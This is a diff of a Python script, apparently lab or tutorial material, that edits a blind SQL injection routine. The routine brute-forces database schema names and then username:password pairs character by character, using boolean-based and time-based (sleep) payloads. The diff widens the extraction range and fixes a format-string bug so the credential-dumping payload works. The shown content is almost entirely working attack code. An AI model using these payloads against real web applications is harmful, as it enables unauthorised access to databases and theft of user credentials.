@@ -2496,7 +2496,7 @@ def makeSQLI():
     p2 = log.progress("Datos extraídos")
     extracted_info = ""
 
-    for position in range(1,50):
+    for position in range(1,250):
         for character in range(33,126):
             sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
 
@@ -2543,9 +2543,9 @@ def makeSQLI():
     p2 = log.progress("Datos extraídos")
     extracted_info = ""
 
-    for position in range(1,50):
+    for position in range(1,250):
         for character in range(33,126):
-            sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users), $d,1))=$d,sleep(0.35),1)" % (position, character)
+            sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users), %d,1))=%d,sleep(0.35),1)" % (position, character)
 
             p1.status(sqli_url)
 
